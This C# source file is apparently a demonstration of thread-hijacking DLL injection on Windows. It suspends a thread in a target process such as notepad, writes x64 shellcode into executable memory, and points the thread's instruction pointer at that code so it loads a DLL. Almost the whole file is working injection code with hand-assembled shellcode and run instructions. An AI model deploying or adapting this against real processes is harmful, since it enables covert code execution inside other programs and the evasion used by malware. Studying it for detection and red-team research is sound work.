// A thread hijacking/injection example written in C# by @pwndizzle
//
// To run:
// 1. Compile code - C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe threadhijack.cs
// 2. Start target process
// 3. Execute binary and specify target e.g. threadhijack.exe notepad
// 4. Either wait for thread to execute or interact with process to see calc!
//
// References:
// http://www.pinvoke.net/default.aspx/kernel32.GetThreadContext
// http://www.rohitab.com/discuss/topic/40579-dll-injection-via-thread-hijacking/
// http://www.codingvision.net/miscellaneous/c-inject-a-dll-into-a-process-w-createremotethread

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.ComponentModel;
using Thunderbolt.Core;
using System.Linq;

public class ThreadHijack
{
    // Import API Functions 
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll")]
    static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll")]
    static extern int ResumeThread(IntPtr hThread);

    [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
    static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);


    // Process privileges
    const int PROCESS_CREATE_THREAD = 0x0002;
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_OPERATION = 0x0008;
    const int PROCESS_VM_WRITE = 0x0020;
    const int PROCESS_VM_READ = 0x0010;

    // Memory permissions
    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;
    const uint PAGE_READWRITE = 4;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    [Flags]
    public enum ThreadAccess : int
    {
        TERMINATE = (0x0001),
        SUSPEND_RESUME = (0x0002),
        GET_CONTEXT = (0x0008),
        SET_CONTEXT = (0x0010),
        SET_INFORMATION = (0x0020),
        QUERY_INFORMATION = (0x0040),
        SET_THREAD_TOKEN = (0x0080),
        IMPERSONATE = (0x0100),
        DIRECT_IMPERSONATION = (0x0200),
        THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
        THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
    }

    public enum CONTEXT_FLAGS : uint
    {
        CONTEXT_i386 = 0x10000,
        CONTEXT_i486 = 0x10000,   //  same as i386
        CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
        CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
        CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
        CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
        CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
        CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
        CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
        CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
    }

    // x86 float save
    [StructLayout(LayoutKind.Sequential)]
    public struct FLOATING_SAVE_AREA
    {
        public uint ControlWord;
        public uint StatusWord;
        public uint TagWord;
        public uint ErrorOffset;
        public uint ErrorSelector;
        public uint DataOffset;
        public uint DataSelector;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
        public byte[] RegisterArea;
        public uint Cr0NpxState;
    }

    // x86 context structure (not used in this example)
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public uint ContextFlags; //set this to an appropriate value 
                                  // Retrieved by CONTEXT_DEBUG_REGISTERS 
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        // Retrieved by CONTEXT_FLOATING_POINT 
        public FLOATING_SAVE_AREA FloatSave;
        // Retrieved by CONTEXT_SEGMENTS 
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        // Retrieved by CONTEXT_INTEGER 
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        // Retrieved by CONTEXT_CONTROL 
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
        // Retrieved by CONTEXT_EXTENDED_REGISTERS 
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] ExtendedRegisters;
    }

    // x64 m128a
    [StructLayout(LayoutKind.Sequential)]
    public struct M128A
    {
        public ulong High;
        public long Low;

        public override string ToString()
        {
            return string.Format("High:{0}, Low:{1}", this.High, this.Low);
        }
    }

    // x64 save format
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct XSAVE_FORMAT64
    {
        public ushort ControlWord;
        public ushort StatusWord;
        public byte TagWord;
        public byte Reserved1;
        public ushort ErrorOpcode;
        public uint ErrorOffset;
        public ushort ErrorSelector;
        public ushort Reserved2;
        public uint DataOffset;
        public ushort DataSelector;
        public ushort Reserved3;
        public uint MxCsr;
        public uint MxCsr_Mask;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public M128A[] FloatRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public M128A[] XmmRegisters;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
        public byte[] Reserved4;
    }

    // x64 context structure
    [StructLayout(LayoutKind.Sequential, Pack = 16)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;

        public CONTEXT_FLAGS ContextFlags;
        public uint MxCsr;

        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;

        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;

        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;

        public XSAVE_FORMAT64 DUMMYUNIONNAME;

        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
        public M128A[] VectorRegister;
        public ulong VectorControl;

        public ulong DebugControl;
        public ulong LastBranchToRip;
        public ulong LastBranchFromRip;
        public ulong LastExceptionToRip;
        public ulong LastExceptionFromRip;
    }

    public static int Inject(IntPtr hProcess, IntPtr hThread, string dllName)
    {
        // Get thread context
        CONTEXT64 tContext = new CONTEXT64
        {
            ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL
        };

        if (GetThreadContext(hThread, ref tContext))
        {
            Console.WriteLine($"CurrentEip   : 0x{tContext.Rip:X}");
        }

        var shellcode = new byte[]
        {
            // Push all registers to save state
            0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x9C,

            // Save rsp and setup stack for function call
            0x53,                                                       //push   rbx
            0x48, 0x89, 0xe3,                                           //mov    rbx,rsp
            0x48, 0x83, 0xec, 0x20,                                     //sub    rsp,0x20
            0x66, 0x83, 0xe4, 0xc0,                                     //and    sp,0xffc0
           
            // Call LoadLibraryA
            0x48, 0xb9, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //movabs rcx,0xCCCCCCCCCCCCCCCC | Pointer to our dll we want to "inject"
            0x48, 0xba, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //movabs rdx,0xCCCCCCCCCCCCCCCC | Pointer to LoadLibraryA
            0xff, 0xd2,                                                 //call   rdx

            // Save return value so we can access it
            0x48, 0xba, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //movabs rdx,0xCCCCCCCCCCCCCCCC | Pointer to where to save the return value
            0x48, 0x89, 0x02,                                           //mov    QWORD PTR [rdx],rax

            // Fix stack
            0x48, 0x89, 0xdc,                                           //mov    rsp,rbx
            0x5b,                                                       //pop    rbx
            
            // Pop all registers from the stack
            0x9D, 0x5F, 0x5E, 0x5D, 0x5C, 0x5B, 0x5A, 0x59, 0x58,

            // Jump back to the where the thread was when we hijacked it
            0x48, 0xbb, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //movabs rbx,0xCCCCCCCCCCCCCCCC | Pointer to original thread RIP
            0xff, 0xe3,                                                 //jmp rbx
            
            // Return value from LoadLibraryA ends up here
            0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,

            // This is the name of the DLL we want to load, right now hardcoded to 'thing.dll'
            0x74, 0x68, 0x69, 0x6e, 0x67, 0x2e, 0x64, 0x6c, 0x6c, 0x00,
        };

        // Allocate memory for shellcode within process
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        Console.WriteLine("A: (this is where you want to attach the debugger, compile in debug mode to break until [enter] here)");

#if DEBUG
        Console.ReadLine();
#endif

        var ownProcess = new IntPtr(-1);

        if (!ProcessExtensions.GetModule(ownProcess, "Kernel32", out IntPtr k32))
            throw new Win32Exception();

        Console.WriteLine($"Kernel32 : 0x{k32:X}");

        var funcs = ProcessExtensions.GetExportedFunctions(ownProcess, k32);
        var loadLibraryPtr = funcs.Where(x => x.Name == "LoadLibraryA").First().Address;

        var returnValuePtr = allocMemAddress + 81;
        var dllStringPtr   = allocMemAddress + 89;
        var returnToPtr    = tContext.Rip;

        Console.WriteLine($"DllStringPtr : 0x{dllStringPtr:X}");
        Console.WriteLine($"LoadLibPtr   : 0x{loadLibraryPtr:X}");
        Console.WriteLine($"RetValPtr    : 0x{returnValuePtr:X}");
        Console.WriteLine($"ReturnToPtr  : 0x{returnToPtr:X}");

        var loadLibraryPtrArr = BitConverter.GetBytes(loadLibraryPtr.ToInt64());

        BitConverter.GetBytes(dllStringPtr  .ToInt64()).CopyTo(shellcode, 23);
        BitConverter.GetBytes(loadLibraryPtr.ToInt64()).CopyTo(shellcode, 33);
        BitConverter.GetBytes(returnValuePtr.ToInt64()).CopyTo(shellcode, 45);
        BitConverter.GetBytes(returnToPtr             ).CopyTo(shellcode, 71);

        // Write shellcode within process
        bool resp1 = WriteProcessMemory(hProcess, allocMemAddress, shellcode, (uint)((shellcode.Length + 1) * Marshal.SizeOf(typeof(char))), out UIntPtr bytesWritten);

        // Read memory to view shellcode
        int bytesRead = 0;
        byte[] buffer = new byte[shellcode.Length];
        ReadProcessMemory(hProcess, allocMemAddress, buffer, buffer.Length, ref bytesRead);
        Console.WriteLine($"Data in memory: {Encoding.UTF8.GetString(buffer)}");

        // Set context EIP to location of shellcode
        tContext.Rip = (ulong)allocMemAddress.ToInt64();

        // Apply new context to suspended thread
        if (!SetThreadContext(hThread, ref tContext))
        {
            Console.WriteLine("Error setting context");
        }
        if (GetThreadContext(hThread, ref tContext))
        {
            Console.WriteLine($"ShellcodeAddress: {allocMemAddress:X}");
            Console.WriteLine($"NewEip          : {tContext.Rip:X}");
        }

        //TODO: Read return value
        Console.WriteLine("TI: Done.");
        return 0;
    }
}